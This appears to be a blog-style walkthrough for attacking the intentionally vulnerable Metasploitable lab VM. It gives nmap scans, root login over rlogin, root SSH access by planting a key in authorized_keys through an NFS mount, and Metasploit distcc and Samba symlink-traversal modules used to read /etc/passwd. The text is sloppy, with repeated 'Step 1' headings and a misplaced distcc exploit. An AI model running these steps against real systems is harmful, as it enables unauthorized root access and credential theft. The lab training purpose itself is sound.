---
title: Metasploitable
published: true
---
The following information shows the **Metasploitable walkthrough**

## [](#header-2)Introduction

   Metasploitable is a Linux based operating system that is designed in a vulnerable way so that the pen-testers and ethical hackers can test their skills. There is no security to the server hence it is always better to _run the metasploitable in a virtual environment_, as anyone can logon into it.
  
### [](#header-3)Requirements
  
   1. Download the vulnerable OS from the following link, **[metaploitable_download_link](https://sourceforge.net/projects/metasploitable/files/Metasploitable2/).**
   2. Kali Linux can be downloaded from the link, **[Kali_Linux_download_link](https://www.kali.org/).**
   3. Virtual Environment, here example is shown using VMware Workstation.
   4. Good understanding of Metasploit Framework(MSF).
   5. Linux commands usage.
       Install both the Operating Systems and run it.
      
      **_NOTE: Installation steps of Kali Linux can be found here,[Kali_linux_insatllation_guide](another_page)_.**
      
   When the OSes installed properly, one can encounter as shown in the following image,
   

# [](#header-1) image 
   
   
   Login into the metasploitable terminal, Username and password would be given(commonly, it is msfadmin)
     
   Get the IP address, `# ifconfig`
   Use that IP_address and perform the following steps: 
        1. Scanning
        
        2. Vulnerability identification/Enumeration
        
        3. Exploitation and Access Gaining 

# [](#header-1) Network Penetration Testing

# [](#header-1)Step 1: Scanning 
   
   In this we need to find the ports that are open and also services running on that each port using which exploitation is done.

   * Open a terminal in Kali Linux and use **_namp_** to perform the Network Scanning
   * Enter the following command, `# nmap -sS -Pn -n ip_address`
     - by default NMAP scans upto 1000 ports, to scan all the ports use either `-p`- or `-p 1-65535`
     - the above command offers the TCP SYN scan, to scan the UDP ports use `-sU`
     - the command also skips the host discovery(no Ping) and DNS resolution
            
      The results can be similar to the following image,
      
      # [](#header-1) image 
         
        ![](https://assets-cdn.github.com/images/icons/emoji/octocat.png)



# [](#header-1)Step 1: Enumeration

nmap -Pn --script vuln 192.168.1.105

   BOOM!!!!!!!!

# [](#header-1)Step 1: Exploitation and Acess Gaining

   There are various to gain access to the Metasploitable target machine. Lets try them as follows,

**_METHOD 1:_**
   
   Ports 512,513,514 offers the ‘r’ services, it means that remote access can be gained from any host using the IP address.
   
   So open a terminal and type, 
   
   **_# rlogin -l root ip_address_** 	

// if asks for password then probably rsh-client is not installed, else you will be in that target machine.

   **_# apt install rsh-client_**

   now execute **_# rlogin -l root ip_address_** 	

// should work perfectly if that service is open


**_METHOD 2: SSH LOGIN_**

   For this we need to generate the RSA key and kinda have to copy that key to that target machine using rpcbind and NFS (port 2049) mount the NFS export (for exporting), and add our key to the root user account's authorized_keys file.
      
   **_# apt update
       
   # apt install rpcbind nfs-common
	
   # rpcinfo -p ip_address
         
   # showmount -e ip_address
         
   # ssh-keygen	//just press enter for the questions asked for default settings
         
   # mkdir /tmp/r00t
        
   # mount -t nfs ip_address:/ /tmp/r00t
   
   # cat ~/.ssh/id_rsa.pub >> /tmp/r00t/root/.ssh/authorized_keys
   
   # umount /tmp/r00t
   
   # ssh root@ip_address_**
         
         
**_METHOD 3: SMB 445_**

   Samba, can also be used as a backdoor to access files that were not meant to be shared when configured with a writeable file share and "wide links" enabled. I used Metasploit Framework to compromise the target.
	
   On msfconsole,
   
   > msf use exploit/unix/misc/distcc_
   
   > set rhost 192.168.214.129
   
   > exploit
   
   On another terminal
   
   # smbclient -L //ip_address
   
   On msfconsole,
    
   > use auxiliary/admin/smb/samba_symlink_traversal

   msf5 auxiliary(admin/smb/samba_symlink_traversal) > set rhost ip_address
   
   msf5 auxiliary(admin/smb/samba_symlink_traversal) > set SMBSHARE tmp
   
   msf5 auxiliary(admin/smb/samba_symlink_traversal) > exploit

   On terminal,
   
   # smbclient  //ip_address/tmp
			// now you will have the smb shell access, try #cd rootfs #cd etc and #more passwd


```
The final element.
```
